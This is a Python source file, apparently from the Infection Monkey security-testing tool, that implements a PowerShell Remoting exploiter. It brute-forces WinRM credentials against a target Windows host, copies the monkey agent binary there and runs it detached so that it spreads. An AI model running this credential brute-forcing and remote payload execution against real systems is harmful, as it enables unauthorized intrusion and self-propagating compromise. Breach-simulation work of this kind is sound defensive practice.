import logging
import os
from typing import List, Optional

import infection_monkey.monkeyfs as monkeyfs
from common.utils.exploit_enum import ExploitType
from infection_monkey.exploit.consts import WIN_ARCH_32
from infection_monkey.exploit.HostExploiter import HostExploiter
from infection_monkey.exploit.powershell_utils import utils
from infection_monkey.exploit.powershell_utils.auth_options import (
    AUTH_NEGOTIATE,
    ENCRYPTION_AUTO,
    AuthOptions,
    get_auth_options,
)
from infection_monkey.exploit.powershell_utils.credentials import Credentials, get_credentials
from infection_monkey.exploit.powershell_utils.powershell_client import (
    AuthenticationError,
    IPowerShellClient,
    PowerShellClient,
)
from infection_monkey.exploit.tools.helpers import get_monkey_depth, get_target_monkey_by_os
from infection_monkey.model import VictimHost
from infection_monkey.utils.environment import is_windows_os

logger = logging.getLogger(__name__)

TEMP_MONKEY_BINARY_FILEPATH = "./monkey_temp_bin"


class PowerShellRemotingDisabledError(Exception):
    pass


class PowerShellExploiter(HostExploiter):
    _TARGET_OS_TYPE = ["windows"]
    EXPLOIT_TYPE = ExploitType.BRUTE_FORCE
    _EXPLOITED_SERVICE = "PowerShell Remoting (WinRM)"

    def __init__(self, host: VictimHost):
        super().__init__(host)
        self._client = None

    def _exploit_host(self):
        try:
            is_https = self._is_client_using_https()
        except PowerShellRemotingDisabledError as e:
            logging.info(e)
            return False

        credentials = get_credentials(
            self._config.exploit_user_list, self._config.exploit_password_list, is_windows_os()
        )
        auth_options = get_auth_options(credentials, is_https)

        self._client = self._authenticate_via_brute_force(credentials, auth_options)
        if not self._client:
            return False

        return self._execute_monkey_agent_on_victim()

    def _is_client_using_https(self) -> bool:
        try:
            logging.debug("Checking if powershell remoting is enabled over HTTP.")
            self._try_http()
            return False
        except AuthenticationError:
            return False
        except Exception as e:
            logging.debug(f"Powershell remoting over HTTP seems disabled: {e}")

        try:
            logging.debug("Checking if powershell remoting is enabled over HTTPS.")
            self._try_https()
            return True
        except AuthenticationError:
            return True
        except Exception as e:
            logging.debug(f"Powershell remoting over HTTPS seems disabled: {e}")
            raise PowerShellRemotingDisabledError("Powershell remoting seems to be disabled.")

    def _try_http(self):
        self._try_ssl_login(use_ssl=False)

    def _try_https(self):
        self._try_ssl_login(use_ssl=True)

    def _try_ssl_login(self, use_ssl: bool):
        credentials = Credentials(
            username="dummy_username",
            secret="dummy_password",
        )

        auth_options = AuthOptions(
            auth_type=AUTH_NEGOTIATE,
            encryption=ENCRYPTION_AUTO,
            ssl=use_ssl,
        )

        PowerShellClient(self.host.ip_addr, credentials, auth_options)

    def _authenticate_via_brute_force(
        self, credentials: List[Credentials], auth_options: List[AuthOptions]
    ) -> Optional[IPowerShellClient]:
        for (creds, opts) in zip(credentials, auth_options):
            try:
                client = PowerShellClient(self.host.ip_addr, creds, opts)

                logger.info(
                    f"Successfully logged into {self.host.ip_addr} using Powershell. User: "
                    f"{creds.username}"
                )
                self.report_login_attempt(True, creds.username, creds.secret)

                return client
            except Exception as ex:  # noqa: F841
                logger.debug(
                    f"Error logging into {self.host.ip_addr} using Powershell. User: "
                    f"{creds.username}, Error: {ex}"
                )
                self.report_login_attempt(False, creds.username, creds.secret)

        return None

    def _execute_monkey_agent_on_victim(self) -> bool:
        arch = self._client.get_host_architecture()
        self.is_32bit = arch == WIN_ARCH_32
        logger.debug(f"Host architecture is {arch}")

        monkey_path_on_victim = (
            self._config.dropper_target_path_win_32
            if self.is_32bit
            else self._config.dropper_target_path_win_64
        )

        is_monkey_copy_successful = self._copy_monkey_binary_to_victim(monkey_path_on_victim)
        if is_monkey_copy_successful:
            logger.info("Successfully copied the monkey binary to the victim.")
            self._run_monkey_executable_on_victim(monkey_path_on_victim)
        else:
            logger.error("Failed to copy the monkey binary to the victim.")
            return False

        return True

    def _copy_monkey_binary_to_victim(self, monkey_path_on_victim) -> bool:
        try:
            self._write_virtual_file_to_local_path()

            logger.info(f"Attempting to copy the monkey agent binary to {self.host.ip_addr}")
            is_monkey_copy_successful = self._client.copy_file(
                TEMP_MONKEY_BINARY_FILEPATH, monkey_path_on_victim
            )
        except Exception as ex:
            raise ex
        finally:
            if os.path.isfile(TEMP_MONKEY_BINARY_FILEPATH):
                os.remove(TEMP_MONKEY_BINARY_FILEPATH)

        return is_monkey_copy_successful

    def _write_virtual_file_to_local_path(self) -> None:
        monkey_fs_path = get_target_monkey_by_os(is_windows=True, is_32bit=self.is_32bit)

        with monkeyfs.open(monkey_fs_path) as monkey_virtual_file:
            with open(TEMP_MONKEY_BINARY_FILEPATH, "wb") as monkey_local_file:
                monkey_local_file.write(monkey_virtual_file.read())

    def _run_monkey_executable_on_victim(self, executable_path) -> None:
        monkey_execution_command = utils.build_monkey_execution_command(
            self.host, get_monkey_depth() - 1, executable_path
        )

        logger.info(
            f"Attempting to execute the monkey agent on remote host " f"{self.host.ip_addr}"
        )

        self._client.execute_cmd_as_detached_process(monkey_execution_command)
